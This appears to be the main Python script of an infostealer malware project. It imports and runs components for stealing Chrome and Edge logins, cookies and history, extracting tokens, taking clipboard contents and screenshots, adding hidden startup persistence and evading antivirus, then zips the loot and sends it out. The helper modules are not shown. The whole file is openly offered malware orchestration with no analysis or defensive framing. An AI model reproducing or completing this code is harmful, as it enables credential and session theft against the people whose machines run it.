import threading, sys, time, subprocess, ctypes, os
from components.wtoken import TokenExtractor
from components.screenshot import take_screenshot
from browsers.chromestealer import extract_logins_cookies_history
from browsers.edgestealer import edgethief
from components.zipandsend import zipnsend
from components.info import send_screenshot
from components.clipboard import steal_data
from components.startup import hiddenstartup
from components.confirmsend import confirmsend
from components.antiantivirus import antiantivirus
def browser():
    threading.Thread(target=extract_logins_cookies_history).start()
    threading.Thread(target=edgethief).start()
    threading.Thread(target=take_screenshot).start()
    threading.Thread(target=hiddenstartup).start()
antiantivirus()
token_extractor = TokenExtractor()
token_extractor.save_tokens()
steal_data()
browser()
send_screenshot()
confirmsend()
time.sleep(1)
zipnsend()